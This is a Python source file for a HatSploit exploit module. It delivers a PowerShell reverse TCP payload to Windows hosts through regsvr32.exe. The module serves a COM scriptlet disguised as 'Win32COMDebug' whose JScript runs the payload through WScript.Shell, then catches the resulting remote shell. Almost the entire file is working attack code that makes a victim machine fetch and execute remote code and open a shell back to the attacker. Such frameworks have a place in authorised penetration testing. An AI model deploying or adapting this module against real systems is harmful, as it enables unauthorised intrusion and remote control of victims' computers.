"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler, HatSploitSession
from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP
from hatsploit.lib.payloads import Payloads


class HatSploitModule(Module, HTTP, Payloads, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Windows regsvr32.exe Reverse HTTP Handler",
            'Module': "exploit/windows/handler/regsvr32_reverse_http",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Windows regsvr32.exe reverse HTTP handler.",
            'Platform': "windows",
            'Rank': "high",
            'Payload': {
                'Value': "windows/generic/powershell_reverse_tcp",
                'Platforms': ['windows'],
            }
        }

        self.urlpath = Option("/", "File path on server.", True)

    def serve_regsvr32(self):
        payload = self.generate_payload(
            "windows/generic/powershell_reverse_tcp",
            {'RHOST': self.payload.payload.rhost, 'RPORT': self.payload.payload.rport},
        )['Payload']

        def get(request):
            if request.path == self.urlpath.value:
                self.print_process("Delivering payload...")

                request.send_response(200)
                request.send_header("Content-type", "text/html")
                request.end_headers()

                request.wfile.write(
                    (
                        "<?XML version=\"1.0\"?>\n"
                        "<scriptlet>\n"
                        "<registration\n"
                        "    description=\"Win32COMDebug\"\n"
                        "    progid=\"Win32COMDebug\"\n"
                        "    version=\"1.00\"\n"
                        "    classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"\n"
                        ">\n"
                        "<script language=\"JScript\">\n"
                        "    <![CDATA[\n"
                        f"        new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\");\n"
                        "    ]]>\n"
                        "</script>\n"
                        "</registration>\n"
                        "<public>\n"
                        "    <method name=\"Exec\"></method>\n"
                        "</public>\n"
                        "</scriptlet>\n"
                    ).encode()
                )

        self.listen_http(methods={'GET': get})

    def run(self):
        self.background(self.serve_regsvr32)

        remote = self.module_handle_session(
            type='reverse_tcp',
            session=HatSploitSession
        )

        if remote:
            self.module_handle(
                sender=remote[0].send_command,
                on_session=remote[0].close
            )
